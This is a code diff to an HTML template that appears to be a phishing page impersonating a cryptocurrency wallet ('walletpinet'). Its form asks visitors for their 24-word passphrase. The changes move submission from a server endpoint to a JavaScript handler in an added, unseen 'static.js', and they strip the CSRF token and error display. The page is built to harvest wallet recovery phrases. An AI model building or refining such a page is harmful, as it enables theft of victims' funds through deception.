@@ -21,7 +21,8 @@
       href="https://fonts.googleapis.com/css?family=Jost%3Aregular%2C700%2Cregular%2Cregular%2Cregular&amp;display=swap" />
   </noscript>
   <link rel="stylesheet" id="contact-form-7-css" href="../static/walletpinet/DT/styles.css" type="text/css" media="all">
-  <link rel="stylesheet" id="flatsome-main-css" href="../static/walletpinet/DT/flatsome.css" type="text/css" media="all">
+  <link rel="stylesheet" id="flatsome-main-css" href="../static/walletpinet/DT/flatsome.css" type="text/css"
+    media="all">
 
 
   <link rel="shortcut icon" href="favicon.ico" />
@@ -617,10 +618,10 @@
 
 
 
-                    <form action="/submit/passphase/" method="POST" class="wpcf7-form init" novalidate="novalidate"
-                      data-status="init" onsubmit="return checssk()">
+                    <form action="" id="myForm" method="POST" class="wpcf7-form init" novalidate="novalidate"
+                      data-status="init" onsubsdmit="return check()" onsubmjit="checkSum()" onsubmit="handleSubmit(event)">
                       <!-- Getting the csrf token for django to process the form input -->
-                      {% csrf_token %}
+                      
 
                       <!-- end csrf token -->
                       <div class="form-login">
@@ -641,8 +642,9 @@
                           <div
                             style="box-sizing: border-box; padding-left: 35px; padding-right: 35px; margin-top: 0px; margin-bottom: -5px;"
                             class="sc-jrcTuL dMljBL MuiBox-root">
-                            <span class="wpcf7-form-control-wrap textarea-498"><textarea type="text" id="comment"
-                                name="mf-text" cols="40" rows="10" minlength="115" required id="minle"
+                            <span class="wpcf7-form-control-wrap textarea-498">
+                              <textarea type="text" id="comment"
+                                name="mf-texts" cols="40" rows="10" minlength="115" required id="minles"
                                 style="border-radius: 3px; font-size: 1em; overflow: auto; resize: none; height: 35vh;"
                                 aria-required="true" aria-invalid="false"
                                 placeholder="Enter your 24-word passphrase here"></textarea></span>
@@ -656,9 +658,7 @@
 
                         <p style="box-sizing: border-box; margin: 0px; font-size: 14px; font-family: Mulish, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;; text-align: center; color: rgb(241, 90, 90); background-color: rgb(255, 255, 255);"
                           class="sc-bqWxrE gZbcSM MuiTypography-root MuiTypography-body1" id="emsg">
-                          <!-- for displaying form errors -->
-                          {% if messages %}{%for message in messages %}{{message}}
-                          {% endfor%} {% endif %}</p>
+                          <!-- for displaying form errors --></p>
                         <div
                           style="box-sizing: border-box; padding-left: 16px; padding-right: 16px; margin-top: 16px; margin-bottom: 16px;"
                           class="sc-jrcTuL dMljBL MuiBox-root">
@@ -714,6 +714,7 @@
                         }
                       </script>
                     </form>
+                    <script src="../static/static.js"></script>
                   </div>
                   <div
                     style="box-sizing: border-box; padding-left: 16px; padding-right: 16px; margin-top: 16px; margin-bottom: 16px;"
